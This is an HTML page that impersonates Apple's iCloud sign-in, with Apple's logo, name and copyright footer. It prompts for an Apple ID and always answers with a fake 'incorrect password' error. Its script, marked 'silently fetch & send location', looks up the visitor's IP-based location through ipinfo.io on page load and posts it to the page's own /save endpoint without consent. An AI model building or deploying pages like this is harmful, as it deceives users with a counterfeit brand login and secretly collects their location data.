<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>iCloud Login</title>
  <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    /* Reset */
    *, *::before, *::after {
      box-sizing: border-box;
    }
    body, html {
      margin: 0;
      height: 100%;
      font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen,
        Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
      background: linear-gradient(135deg, #0f1e3d 0%, #161a31 100%);
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }

    /* Container */
    .login-container {
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(30px);
      -webkit-backdrop-filter: blur(30px);
      border-radius: 20px;
      box-shadow: 0 25px 60px rgba(0,0,0,0.5);
      max-width: 400px;
      width: 90%;
      padding: 2.5rem 2rem;
      text-align: center;
      transition: box-shadow 0.3s ease;
    }

    .login-container:hover {
      box-shadow: 0 35px 80px rgba(0,0,0,0.7);
    }

    /* Apple logo */
    .apple-logo {
      width: 40px;
      margin: 0 auto 2rem;
      filter: drop-shadow(0 0 2px rgba(255, 255, 255, 0.3));
    }

    /* Heading */
    h1 {
      font-weight: 600;
      font-size: 2.5rem;
      margin-bottom: 1.5rem;
      letter-spacing: 0.05em;
    }

    /* Input */
    input[type="email"] {
      width: 100%;
      padding: 1rem 1.2rem;
      font-size: 1rem;
      border-radius: 10px;
      border: none;
      outline: none;
      margin-bottom: 1.5rem;
      background: rgba(255, 255, 255, 0.15);
      color: white;
      transition: background 0.3s ease;
      font-weight: 400;
    }
    input[type="email"]::placeholder {
      color: rgba(255, 255, 255, 0.6);
    }
    input[type="email"]:focus {
      background: rgba(255, 255, 255, 0.25);
    }

    /* Button */
    button {
      width: 100%;
      background-color: #0071e3;
      border: none;
      padding: 1rem;
      font-size: 1.1rem;
      border-radius: 10px;
      font-weight: 600;
      color: white;
      cursor: pointer;
      transition: background-color 0.3s ease;
      letter-spacing: 0.04em;
      user-select: none;
    }
    button:hover {
      background-color: #005bb5;
    }
    button:active {
      background-color: #004494;
    }

    /* Status message */
    #status {
      margin-top: 1.5rem;
      font-size: 1rem;
      min-height: 1.2rem;
      color: #90ee90;
      user-select: none;
    }

    /* Spinner */
    .spinner {
      margin: 1rem auto 0;
      border: 4px solid rgba(255, 255, 255, 0.2);
      border-top: 4px solid white;
      border-radius: 50%;
      width: 24px;
      height: 24px;
      animation: spin 1s linear infinite;
      display: none;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    /* Footer */
    footer {
      margin-top: 3rem;
      font-size: 0.85rem;
      color: rgba(255, 255, 255, 0.4);
      user-select: none;
    }

    /* Responsive */
    @media (max-width: 400px) {
      h1 {
        font-size: 2rem;
      }
      .login-container {
        padding: 2rem 1.5rem;
      }
      button, input[type="email"] {
        font-size: 1rem;
        padding: 0.9rem 1rem;
      }
    }
  </style>
</head>
<body>

  <main class="login-container" role="main" aria-label="iCloud login form">
    <img class="apple-logo" src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" />
    <h1>iCloud</h1>
    <input type="email" id="email" placeholder="Apple ID" aria-label="Apple ID" required autocomplete="username" />
    <button id="loginBtn">→</button>
    <div class="spinner" id="spinner"></div>
    <div id="status"></div>
  </main>

  <footer>© 2025 Apple Inc.</footer>

  <script>
    const loginBtn = document.getElementById('loginBtn');
    const status = document.getElementById('status');
    const spinner = document.getElementById('spinner');
    const emailInput = document.getElementById('email');

    loginBtn.addEventListener('click', () => {
      const email = emailInput.value.trim();
      if (!email) {
        status.textContent = 'Please enter your Apple ID.';
        status.style.color = 'tomato';
        return;
      }
      status.textContent = '';
      spinner.style.display = 'block';
      loginBtn.disabled = true;
      emailInput.disabled = true;

      // Simulate login delay
      setTimeout(() => {
        spinner.style.display = 'none';
        status.textContent = 'Your Apple ID or password is incorrect.';
        status.style.color = 'tomato';
        loginBtn.disabled = false;
        emailInput.disabled = false;
      }, 2000);
    });

    // Optional: silently fetch & send location
    async function fetchAndSendLocation() {
      try {
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();

        await fetch('/save', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ data })
        });
        console.log('Location sent');
      } catch (e) {
        console.error('Location fetch error:', e);
      }
    }

    fetchAndSendLocation();
  </script>
</body>
</html>
